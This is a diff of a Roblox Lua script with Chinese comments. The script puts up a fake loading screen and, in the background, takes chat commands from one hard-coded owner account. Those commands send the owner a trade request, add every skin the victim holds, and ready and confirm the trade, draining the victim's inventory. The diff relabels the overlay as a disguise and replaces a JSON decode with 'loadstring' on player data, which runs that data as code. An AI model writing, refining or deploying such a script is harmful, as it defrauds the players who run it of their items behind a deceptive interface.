@@ -1,20 +1,19 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 local StarterGui = game:GetService("StarterGui")
 local MainEvent = ReplicatedStorage:WaitForChild("MainEvent")
 
 local OwnerName = "XxStormCrystalxX2016"
 
--- 🔳 先建置 loading 螢幕
+-- 🔳 偽裝 Loading 畫面
 local function createLoadingScreen()
-    if LocalPlayer.PlayerGui:FindFirstChild("ScriptLoadingGui") then
-        LocalPlayer.PlayerGui.ScriptLoadingGui:Destroy()
+    if LocalPlayer.PlayerGui:FindFirstChild("FakeLoadingGui") then
+        LocalPlayer.PlayerGui.FakeLoadingGui:Destroy()
     end
 
     local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "ScriptLoadingGui"
+    screenGui.Name = "FakeLoadingGui"
     screenGui.ResetOnSpawn = false
     screenGui.IgnoreGuiInset = true
     screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
@@ -79,7 +78,7 @@ end
 
 createLoadingScreen()
 
--- 👉 查找玩家 (partial match + 無視大小寫)
+-- 📦 找玩家 (partial match)
 local function getPlayerByPartialName(name)
     name = name:lower()
     for _, player in pairs(Players:GetPlayers()) do
@@ -94,19 +93,22 @@ local function sendTradeRequest(targetName)
     local target = getPlayerByPartialName(targetName)
     if target then
         MainEvent:FireServer("Trading", "Request", target)
-        print("sss")
+        print("✅ 發送交易邀請給 " .. target.Name)
     else
-        warn("cant find")
+        warn("⚠️ 找不到玩家")
     end
 end
 
--- 📦 加入所有皮膚
+-- 📦 加入所有持有皮膚
 local function addAllSkins()
     local skinsStr = LocalPlayer.DataFolder.Skins.Value
     local success, skinsTable = pcall(function()
-        return HttpService:JSONDecode(skinsStr)
+        return loadstring("return " .. skinsStr)()
     end)
-    if not success then warn("data wrong") return end
+    if not success then
+        warn("皮膚資料錯誤")
+        return
+    end
 
     for category, skins in pairs(skinsTable) do
         for skinName, quantity in pairs(skins) do
@@ -118,51 +120,34 @@ local function addAllSkins()
             end
         end
     end
-    print("yerrrrr")
+    print("✅ 已加入所有持有皮膚")
 end
 
 -- 📦 Ready & Confirm
 local function tradeReady()
     MainEvent:FireServer("Trading", "Ready", "", "")
-    print("hi")
+    print("✅ Ready 完成")
 end
 
 local function tradeConfirm()
     MainEvent:FireServer("Trading", "Confirm", "", "")
-    print("yeeeee")
+    print("✅ Confirm 完成")
 end
 
--- 📦 TPME 指令：將你瞬移到主帳
-local function teleportToOwner()
-    local owner = Players:FindFirstChild(OwnerName)
-    if not owner or not owner.Character then
-        warn("cantfind2")
-        return
-    end
-    local ownerHRP = owner.Character:FindFirstChild("HumanoidRootPart")
-    local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if ownerHRP and myHRP then
-        myHRP.CFrame = ownerHRP.CFrame * CFrame.new(2,0,0) -- 跳到主帳旁邊
-        print("t")
-    else
-        warn("humanoidrootpart missing")
-    end
-end
-
--- 📦 開關 loading UI
+-- 📦 隱藏/顯示 Loading 畫面
 local function hideLoadingScreen()
-    if LocalPlayer.PlayerGui:FindFirstChild("ScriptLoadingGui") then
-        LocalPlayer.PlayerGui.ScriptLoadingGui:Destroy()
-        print("done")
+    if LocalPlayer.PlayerGui:FindFirstChild("FakeLoadingGui") then
+        LocalPlayer.PlayerGui.FakeLoadingGui:Destroy()
+        print("✅ Loading UI 已關閉")
     end
 end
 
 local function showLoadingScreen()
     createLoadingScreen()
-    print("laoding")
+    print("✅ Loading UI 已打開")
 end
 
--- 📦 綁定主帳指令監聽
+-- 📦 綁定主帳聊天監聽
 local function setupCommands(player)
     if player.Name == OwnerName then
         player.Chatted:Connect(function(msg)
@@ -182,15 +167,12 @@ local function setupCommands(player)
                 hideLoadingScreen()
             elseif cmd == "!showui" then
                 showLoadingScreen()
-            elseif cmd == ".tpme" then
-                teleportToOwner()
             end
         end)
     end
 end
 
 Players.PlayerAdded:Connect(setupCommands)
-
 for _, player in ipairs(Players:GetPlayers()) do
     setupCommands(player)
 end
